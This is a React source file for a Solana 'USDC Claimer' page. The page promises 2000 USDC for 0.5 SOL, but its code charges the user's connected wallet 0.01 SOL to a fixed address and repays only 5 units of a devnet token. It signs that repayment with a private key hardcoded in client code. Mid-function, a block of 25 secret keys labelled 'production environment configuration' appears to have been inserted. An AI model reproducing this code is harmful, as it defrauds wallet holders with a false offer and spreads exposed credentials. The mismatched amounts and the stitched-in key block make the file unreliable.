/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "2pLELuRxWR3tDHyMbqwfd9ycrRPQUBxfbgKtC4JURJR7XYqBnbaYr4w2HYMMM9Jf863HwetQHTAEas6ie8wVT96D"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4stLhtmLLWDsSxz6sWfBhTFt73PujCtuTDCFzSZESUfLb3isNobToAzDQcDwKjpcGCBTi7xf8EsiGpmqA3MXcnv8",
  "key1": "8Ex5Xhcw54ku7Jfw9W9wcswvQcemqcJXVSmymttqpKT6ZFNVbWfw6FztQvX5Q45KhqF78EdqFGGT2fZsRhp3CXM",
  "key2": "4mAGYsaUkTTWWixSPiQeLA2BURkhMiadvQJ4g127KBksyGg4PzdWqank9bnDNK3gaYuAgoJAiHxorEWJncSb2MmS",
  "key3": "1BcCEUyUb5yLTb6B4pZWqc15afyKZhSoXqu6aYBNhUYuC19JLsUXLfowi3CNuvem587STLbyQLx9oMZHUULTFVc",
  "key4": "41qzdgTJ9hntx6D3ehyKA6c1SYFE4q97oxUR6YfCXNfwy6EctU9jx6qKFFPoc6NB5YDw8V8YkjoVBi1XjNMp1sdi",
  "key5": "4jUr3vJ7A1gPy6VEAq4LCPyD8sVsM2ghBsLEwfPPok5VZugxn9mLNAqdUU4ui1K2CMcoXf6FbK1drr7QkYFfkMcM",
  "key6": "4Q2zRHyTY27XBFWdBrVf3ft3fx9gcHutwbQ3P3oZ8wzzcXBdoV5jRuyHeiKThMg7xJvDnzXLCvHpAHEjF362u64A",
  "key7": "3GcZYPmeAHoVVXHpgFN8psaxR1S2P2jmjnWT4zh8FrDJTsWhY2Lmja4bnycWKxo7yFUppKHW9MATHYvKbAmS7WGn",
  "key8": "4ZRC1eS86azxXMyT7WVwuY95RPPFXy8HqWSyqTe1xCjbZNzXKzwja2HHBkfnjjcLxUg35G52sG5T73NBGX3PvfB",
  "key9": "2YyvF9nc9zwvfmVnPYYxrHHBh7xZFcF5FV2MqzQmqJbGzv5MATCYirR7AFNZKHkpfBCQP43ugS9ywHn2JwL1z7u6",
  "key10": "3AYJ8ZPGQZz5PcadU6B3nmMB5n2Naauo9bFRwxSzREBnedvxCdnFMqMQRJQ2ZahhgAPzD4V9hzGCSQRX5ZJkzwW1",
  "key11": "3kYNhPL4zQeiAGFZHzKPwGXJ2vYa3RZATjeF3f5LRe9dbT4Q3o89rofzzVyS63pCDvtWrydLYJUZpNesoC6DYJfh",
  "key12": "2UdMP7nm8MmmEofsBHB51jDaHpmJdDa8oiZQHCS9oMxy4QGnGfhSsxvr9x3FLAJp2hZfQczUhp58G6NHxNJcoPeL",
  "key13": "5byAjGbUMAjC1tu7qq2Z3Dj7TiUSAQKhU88FndrWD8xCtNgJoL4cAdU5CdCjsJ4WxEVLVXkkXsTXeYa6CjoCvRTG",
  "key14": "47NqgXuc5DEcUoEW1aF3fhyYCkvKCuxXbvWdtPr5kGG1trXEvVt2xh7vcMdP6ZTSZZKVgHbiLhzUVwECCavi3Xdv",
  "key15": "5LZA9CP9yEty4zRRKhvjjEkfHqUtyHsQgJtvn4CoHZThwNzXfa9NiTqdh3yg6nYEQ8ZoeQE8gnMGb4FRXvAK8Vwy",
  "key16": "QCTKT1rGr8DZa849hCAuqzXGczCXjtxVqomRmLNGyaQL92T3kve3ix8TVSVFBFovfmJkmwDRzE4GtnCqjDJHv5z",
  "key17": "4RPUrgo1jStWbznwDXvCogD4rTt5YRnEAVrwCnQGMPjAcFr1dfSYvYJ8mQdoHfsNPDc9EjoNQkrcMjFmKQHjedMy",
  "key18": "3DN2gwWRkcGtKDnPSkYbYLajLezHy4WAeL7wZLcET1ndpP7X2oFsvT9EYN8nsUpHKmQ3Am246Mfm8kn2ENVnmkrf",
  "key19": "58EADsZAVZwNHwVqiyDnLSeMFtqMCjJPxELvnTdUaePtjAYp1oBSSfR84qnB32nk5jx2ywQKwcfHSTE3CNYhQU5j",
  "key20": "46oU7aWuj5woWJCyQhvqp16HXoKkgK4kpZh2YRXrx19CwWDZeTofMPcDTFnsEEyaY1623V8DrFzwvqs9M1xZWLQG",
  "key21": "3BXsfaXyqKTpirKVt83bos6qVnzk7ypL7xoUNeMjk5hRiZ7F3ZtiZGavfZsbH2o4bMuZHACh1C278deYZhXnmdXk",
  "key22": "3Urzz4XE33URcDdLKFdrnRuaf1cqXCuYbfkWjkbW8ZZrcXVgcGh9igf4tdEZ4MHgRBweeXkyosb9WQNaQzESzXS7",
  "key23": "2F9Pbrxg6QBe5iTCMHfqKZsFYxm52xn4tsmFrVp71EP3gcbsWk9T8eGoWMZBxCVwd9jJVBbSvfd4YLqSC3qa6v4C",
  "key24": "6LMJRCEaqPswbij5QFKuhDYfsZFWKJvYh6xFrXwtTKAAVAbkL9G1KfmxHhjKM9RmYFWGt7QGaoSVGFXGa7NNrdT"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
